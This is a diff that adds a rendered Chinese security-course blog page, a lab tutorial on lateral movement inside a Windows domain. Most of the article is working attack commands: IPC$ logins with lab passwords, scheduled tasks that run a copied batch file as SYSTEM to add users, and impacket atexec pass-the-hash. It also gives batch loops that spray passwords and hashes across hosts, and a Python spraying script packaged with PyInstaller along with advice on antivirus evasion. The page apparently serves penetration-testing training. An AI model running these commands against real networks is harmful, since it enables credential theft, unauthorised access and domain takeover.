@@ -1,32 +1,306 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>66-内网安全-域横向批量at&amp;schtasks&amp;impacket | HVVL404</title><meta name="author" content="HVVL404"><meta name="copyright" content="HVVL404"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="66-内网安全-域横向批量at&amp;schtasks&amp;impacket">
+<meta property="og:type" content="article">
+<meta property="og:title" content="66-内网安全-域横向批量at&amp;schtasks&amp;impacket">
+<meta property="og:url" content="http://example.com/2023/05/04/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/66-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/index.html">
+<meta property="og:site_name" content="HVVL404">
+<meta property="og:description" content="66-内网安全-域横向批量at&amp;schtasks&amp;impacket">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/avatar.png">
+<meta property="article:published_time" content="2023-05-04T09:44:20.007Z">
+<meta property="article:modified_time" content="2023-05-06T16:07:00.284Z">
+<meta property="article:author" content="HVVL404">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/avatar.png"><link rel="shortcut icon" href="/images/hacker.png"><link rel="canonical" href="http://example.com/2023/05/04/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/66-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&amp;schtasks&amp;impacket/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '66-内网安全-域横向批量at&schtasks&impacket',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-05-07 00:07:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-    if theme.reward.enable && theme.reward.QR_code
-      !=partial('includes/post/reward', {}, {cache: true})
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="HVVL404" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">44</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/bg.png')"><nav id="nav"><span id="blog-info"><a href="/" title="HVVL404"><span class="site-name">HVVL404</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">66-内网安全-域横向批量at&amp;schtasks&amp;impacket</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-04T09:44:20.007Z" title="发表于 2023-05-04 17:44:20">2023-05-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-06T16:07:00.284Z" title="更新于 2023-05-07 00:07:00">2023-05-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/">小迪安全（内网篇）</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="66-内网安全-域横向批量at&amp;schtasks&amp;impacket"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>66-内网安全-域横向批量at&amp;schtasks&amp;impacket</p>
+<span id="more"></span>
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .ads-wrap!=theme.ad.post
+<p>思维导图</p>
+<p><img src="/%5Cimages%5Cxiaodi%5C66-1.png" alt="66-1"></p>
+<p>本课重点</p>
+<ul>
+<li>案例1：横向渗透明文传递</li>
+<li>案例2：横向渗透明文HASH传递atexec-impacket</li>
+<li>案例3：横向渗透明文HASH传递批量利用-综合</li>
+<li>案例4：横向渗透明文HASH传递批量利用-升级版</li>
+</ul>
+<p>环境准备</p>
+<p><img src="/%5Cimages%5Cxiaodi%5C66-2.png" alt="66-2"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">2008 r2 webserver 域内web服务器</span><br><span class="line">本地管理员账号密码: .\administraotr:admin!@#45</span><br><span class="line">当前机器域用户密码: god\webadmin:admin!@#45</span><br><span class="line"> </span><br><span class="line">2003 x86 fileserver 域内文件服务器</span><br><span class="line">本地管理员账号密码：administrator:admin</span><br><span class="line">当前机器域用户密码: god\fileadmin:Admin12345</span><br><span class="line"> </span><br><span class="line">2008 r2 x64 dc god.org 主域控机器</span><br><span class="line">域管账号密码: God\administrator:Admin12345</span><br><span class="line"> </span><br><span class="line">2012 sqlserver 域内数据库服务器</span><br><span class="line">本地管理员账号密码：.\administrator:admin!@#45</span><br><span class="line">当前机器域用户密码：god\dbadmin:admin!@#45</span><br><span class="line"> </span><br><span class="line">w7 x64 mary-pc 域内个人机</span><br><span class="line">本地管理员账号密码：.\mary:admin</span><br><span class="line">当前机器域用户密码：god\mary:admin!@#45</span><br><span class="line"> </span><br><span class="line">w8.1 x64 jack-pc 域内个人机</span><br><span class="line">本地管理员账号密码：.\jack:admin</span><br><span class="line">当前机器域用户密码：god\boss:Admin12345</span><br></pre></td></tr></table></figure>
 
-    if theme.post_pagination
-      include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
+<p><strong>案例1：横向渗透明文传递</strong></p>
+<p>在拿下一台内网主机，通过本地信息搜集收集用户凭据等信息后，如何横向渗透拿下更多的主机？这里仅介绍at&amp;schtasks命令的使用，在已知目标系统的用户明文密码的基础上，直接可在远程主机上执行命令。</p>
+<p>获取到某域主机权限-&gt;  minikatz得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做字典-&gt;尝试连接-&gt;创建计划任务（at|schtasks）-&gt;执行文件可为后门或者相关命令</p>
+<p>IPC（ Internet Process Connection）是共享“命名管道”的资管，它是为了让进城间通信而开放的命名管道，可以通过验证用户名和密码获得相关的权限，在远程管路计算机和查看计算机的共享资源时使用。</p>
+<p>利用流程：</p>
+<ul>
+<li>1.建立IPC链接到目标主机</li>
+<li>2.拷贝要执行的命令脚本到目标主机</li>
+<li>3.查看目标时间，创建计划任务（ at,schtasks ）定时执行拷贝到的脚本</li>
+<li>4.删除IPC链接</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">net use \\server\ipc$&quot;password&quot; /user:username # 工作组</span><br><span class="line">net use \\server\ipc$&quot;password&quot; /user:domain\username #域内</span><br><span class="line">dir \\xx.xx.xx.xx\C$\                # 查看文件列表</span><br><span class="line">copy \\xx.xx.xx.xx\C$\1.bat 1.bat  # 下载文件</span><br><span class="line">copy 1.bat \\xx.xx.xx.xx\C$  # 复制文件</span><br><span class="line">net use \\xx.xx.xx.xx\C$\1.bat /del  # 删除文件</span><br><span class="line">net use \\xx.xx.xx.xx\ipc$ \del     # 删除IPC</span><br><span class="line">net view xx.xx.xx.xx                # 查看对方共享</span><br></pre></td></tr></table></figure>
 
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache: true})
-      
+<p>建立IPC常见的错误代码</p>
+<ul>
+<li>(1) 5：拒绝访问，可能是使用的不是管理员权限，需要先提升权限</li>
+<li>(2) 51：网络问题，windoows无法找到网络路径</li>
+<li>(3) 53：找不到网站路径，可能是IP地址错误，目标未开机，目标Lanmanserver服务未启动、有防火墙等问题</li>
+<li>(4) 67：找不到网络名，本地Lanmanworkstation服务未启动，目标删除ipc$</li>
+<li>(5) 1219：提供的凭据和已存在的凭据集冲突，说明已建立IPC$，需要先删除</li>
+<li>(6) 1326：账号密码错误</li>
+<li>(7) 1792：目标NetLogon服务未启动，连接域控常常会出现此情况</li>
+<li>(8) 2242：用户密码过期，目标有账号策略，强制定期更改密码</li>
+</ul>
+<p>建立IPC失败的原因</p>
+<ul>
+<li>(1) 目标系统不是NT或以上的操作系统</li>
+<li>(2) 对方没有打开IPC$共享</li>
+<li>(3) 对方未开启139,445端口，或者被防火墙屏蔽</li>
+<li>(4) 输出命令，账号密码有错误</li>
+</ul>
+<p>[at] &amp; [schtasks]</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#at &lt; Windows2012</span><br><span class="line">net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator # 建立ipc连接</span><br><span class="line">copy add.bat \192.168.3.21\c$  #拷贝执行文件到目标机器</span><br><span class="line">at \\192.168.3.21 15:47 c:\add.bat    #添加计划任务</span><br><span class="line"> </span><br><span class="line">schtasks &gt;=Windows2012</span><br><span class="line">net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god.org\administrator # 建立ipc连接</span><br><span class="line">copy add.bat \\192.168.3.32\c$ #复制文件到其C盘</span><br><span class="line">schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F #创建adduser任务对应执行文件</span><br><span class="line">schtasks /run /s 192.168.3.32 /tn adduser /i #运行adduser任务</span><br><span class="line">schtasks /delete /s 192.168.3.21 /tn adduser /f#删除adduser任务</span><br></pre></td></tr></table></figure>
+
+<p>案例演示</p>
+<p>&lt;1&gt;获取到DC的IP地址。执行以下两个命令时，需要域用户登录，而不是本地用户登录</p>
+<p><img src="/%5Cimages%5Cxiaodi%5C66-3.png" alt="66-3"></p>
+<p>&lt;2&gt;假设已经找到DC的用户名密码（具体后面再详细讲）</p>
+<p>&lt;3&gt;横向渗透</p>
+<p>由于域控DC是Win2008R2（&lt; Windows2012），可以使用at命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator # 建立ipc连接</span><br><span class="line">copy add.bat \192.168.3.21\c$ #拷贝执行文件到目标机器</span><br><span class="line">at \\192.168.3.21 15:47 c:\add.bat #添加计划任务</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%5Cimages%5Cxiaodi%5C66-4.png" alt="66-4"></p>
+<p><img src="/%5Cimages%5Cxiaodi%5C66-5.png" alt="66-5"></p>
+<p>一段时候后，xiaodi用户就自动添加成功了。</p>
+<p><img src="/%5Cimages%5Cxiaodi%5C66-6.png" alt="66-6"></p>
+<p>&lt;4&gt;如果目标计算机&gt;&#x3D;Windows2012，需要使用schtasks命令。</p>
+<p>比如前期信息收集得到了sqlserver的用户名密码，SqlServer是window2012系统。</p>
+<p><img src="/%5Cimages%5Cxiaodi%5C66-7.png" alt="66-7"></p>
+<p><img src="/%5Cimages%5Cxiaodi%5C66-8.png" alt="66-8"></p>
+<p>如下图，当使用域用户登录时，copy是失败的，原因是权限不够，应该使用本地用户登录。</p>
+<p><img src="/%5Cimages%5Cxiaodi%5C66-9.png" alt="66-9"></p>
+<p>使用本地用户登录，执行如下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god.org\administrator # 建立ipc连接</span><br><span class="line">copy add.bat \\192.168.3.32\c$ #复制文件到其C盘</span><br><span class="line">schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F #创建adduser任务对应执行文件</span><br><span class="line">schtasks /run /s 192.168.3.32 /tn adduser /i #运行adduser任务</span><br><span class="line">schtasks /delete /s 192.168.3.21 /tn adduser /f#删除adduser任务</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%5Cimages%5Cxiaodi%5C66-10.png" alt="66-10"></p>
+<p>等待一段时间，成功添加新用户。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user 查看用户中是否多了一个xiaodi</span><br><span class="line">net user xiaodi 查看xiaodi账户创建时间是否为刚才计划任务的时间</span><br><span class="line">net user xiaodi /del 不需要了的话可以删除</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%5Cimages%5Cxiaodi%5C66-11.png" alt="66-11"></p>
+<p><strong>案例2：横向渗透明文HASH传递atexec-impacket</strong></p>
+<p>atexec</p>
+<ul>
+<li>优点：一句话命令，连接、提权全部搞定。</li>
+<li>缺点：第三方工具，非微软官方工具，易被杀毒软件查杀，实战中需要自己做一下免杀。</li>
+<li>atexec是Impacket网络协议工具包中的一个工具。Impacket工具包介绍：<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/175208.html">https://www.freebuf.com/sectool/175208.html</a></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;</span><br><span class="line">atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;</span><br><span class="line">atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p>案例演示</p>
+<p>&lt;1&gt;impacket工具包下载，可下载exe版本</p>
+<ul>
+<li>地址：<a target="_blank" rel="noopener" href="https://gitee.com/RichChigga/impacket-examples-windows">https://gitee.com/RichChigga/impacket-examples-windows</a></li>
+</ul>
+<p><img src="/%5Cimages%5Cxiaodi%5C66-12.png" alt="66-12"></p>
+<p>&lt;2&gt;执行命令，直接提权</p>
+<p><img src="/%5Cimages%5Cxiaodi%5C66-13.png" alt="66-13"></p>
+<p><img src="/%5Cimages%5Cxiaodi%5C66-14.png" alt="66-14"></p>
+<p><strong>案例3：横向渗透明文HASH传递批量利用-综合</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FOR /F %%i in (ips.txt) do net use \%%i\ipc$ &quot;admin!@#45&quot; /user:administrator #批量检测IP对应明文连接</span><br><span class="line">FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami #批量检测IP对应明文回显版</span><br><span class="line">FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami #批量检测明文对应IP回显版</span><br><span class="line">FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami #批量检测HASH对应IP回显版</span><br></pre></td></tr></table></figure>
+
+<p>&lt;1&gt;websever登录，运行mimikatz，得到用户名密码。</p>
+<p><img src="/%5Cimages%5Cxiaodi%5C66-15.png" alt="66-15"></p>
+<p>&lt;2&gt;用微软自带命令探测网段存活主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL =&quot; 自带内部命令（推荐使用）</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%5Cimages%5Cxiaodi%5C66-16.png" alt="66-16"></p>
+<p>&lt;3&gt;批量检测IP对应明文连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR /F %%i in (ips.txt) do net use \%%i\ipc$ &quot;admin!@#45&quot; /user:administrator #批量检测IP对应明文连接</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%5Cimages%5Cxiaodi%5C66-17.png" alt="66-17"></p>
+<p><img src="/%5Cimages%5Cxiaodi%5C66-18.png" alt="66-18"></p>
+<p><img src="/%5Cimages%5Cxiaodi%5C66-19.png" alt="66-19"></p>
+<p>发现网段内另一台主机192.168.3.29（jack-pc）与webserver用了相同的账户密码，并且可以直接提权到system权限。</p>
+<p>&lt;4&gt;在jack-pc上运行mimikatz，获取到另一个账户密码。</p>
+<p><img src="/%5Cimages%5Cxiaodi%5C66-20.png" alt="66-20"></p>
+<p>&lt;5&gt;接下来，可以使用新密码继续批量检测IP对应明文。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami #批量检测IP对应明文回显版</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%5Cimages%5Cxiaodi%5C66-21.png" alt="66-21"></p>
+<p>执行at_ip.bat，发现192,.168.3.21也用了该密码，而它正好就是域控！</p>
+<p><img src="/%5Cimages%5Cxiaodi%5C66-22.png" alt="66-22"></p>
+<p>&lt;6&gt;或者可以采用另一种方法，由于此时我们已经拿到了2个真实的账号密码，可以写一个字典表，直接去探测域控。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami #批量检测明文对应IP回显版</span><br><span class="line">FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami #批量检测HASH对应IP回显版</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%5Cimages%5Cxiaodi%5C66-23.png" alt="66-23"></p>
+<p><img src="/%5Cimages%5Cxiaodi%5C66-24.png" alt="66-24"></p>
+<p>执行at_ip.bat，找到了域控192,.168.3.21的密码！直接提权！</p>
+<p><img src="/%5Cimages%5Cxiaodi%5C66-25.png" alt="66-25"></p>
+<p>当然了，这是我们测试环境，实战中一般没这么快！至少需要很多轮的信息收集，才能逐渐靠近域控。</p>
+<p><strong>案例4：横向渗透明文HASH传递批量利用-升级版</strong></p>
+<p>前期除了收集明文密码HASH等，还收集了用户名，用户名配合密码字典能吃西瓜？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \192.168.3.32\ipc$ admin!@#45 /user:god\dbadmin</span><br></pre></td></tr></table></figure>
+
+<p>案例3中都是批处理命令，只能遍历一个变量（不知道可不可遍历2个变量，反正我不会写），如果想要遍历多个变量，比如IP、用户名、密码等，可以写python脚本，免杀，使用Pyinstaller打包成exe文件，上传到目标机器运行。</p>
+<p>脚本（最好写成多线程的）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import os,time</span><br><span class="line">ips=&#123;</span><br><span class="line">   &#x27;192.168.3.21&#x27;,</span><br><span class="line">   &#x27;192.168.3.25&#x27;,</span><br><span class="line">   &#x27;192.168.3.29&#x27;,</span><br><span class="line">   &#x27;192.168.3.30&#x27;,</span><br><span class="line">   &#x27;192.168.3.31&#x27;,</span><br><span class="line">   &#x27;192.168.3.33&#x27;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">users=&#123;</span><br><span class="line">   &#x27;Administrator&#x27;,</span><br><span class="line">   &#x27;boss&#x27;,</span><br><span class="line">   &#x27;dbadmin&#x27;,</span><br><span class="line">   &#x27;fileadmin&#x27;,</span><br><span class="line">   &#x27;mack&#x27;,</span><br><span class="line">   &#x27;mary&#x27;,</span><br><span class="line">   &#x27;vpnadm&#x27;,</span><br><span class="line">   &#x27;webadmin&#x27;</span><br><span class="line">&#125;</span><br><span class="line">passs=&#123;</span><br><span class="line">   &#x27;admin&#x27;,</span><br><span class="line">   &#x27;admin!@#45&#x27;,</span><br><span class="line">   &#x27;Admin12345&#x27;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">for ip in ips:</span><br><span class="line">   for user in users:</span><br><span class="line">       for mima in passs:</span><br><span class="line">           exec=&quot;net use \&quot;+ &quot;\&quot;+ip+&#x27;\ipc$ &#x27;+mima+&#x27; /user:god\&#x27;+user</span><br><span class="line">           print(&#x27;---&gt;&#x27;+exec+&#x27;&lt;---&#x27;)</span><br><span class="line">           os.system(exec)</span><br><span class="line">           time.sleep(1)</span><br></pre></td></tr></table></figure>
+
+<p>编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstaller</span><br><span class="line">pyinstaller -F fuck_neiwang_001.py 生成可执行EXE</span><br></pre></td></tr></table></figure>
+
+<p>案例演示</p>
+<p>&lt;1&gt;首先，查看网络连接，此时结果是空的，没有连接；然后运行exe文件，结束后再次查看网络连接，发现连接上了5台主机。</p>
+<p><img src="/%5Cimages%5Cxiaodi%5C66-26.png" alt="66-26"></p>
+<p>&lt;2&gt;接下来，拷贝执行文件到目标主机，执行at或者schtasks命令创建任务即可。</p>
